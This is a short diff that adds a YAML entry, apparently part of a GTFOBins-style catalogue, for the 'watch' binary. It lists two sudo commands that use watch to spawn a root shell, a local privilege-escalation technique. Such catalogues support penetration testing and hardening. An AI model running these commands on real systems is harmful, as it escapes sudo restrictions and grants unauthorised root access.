@@ -1,0 +1,5 @@
+name: watch
+binary_path: /usr/bin/watch
+exploit_cmds:
+- sudo /usr/bin/watch -x /bin/sh -c 'reset; exec /bin/sh 1>&0 2>&0'
+- sudo /usr/bin/watch 'reset; exec /bin/sh 1>&0 2>&0'
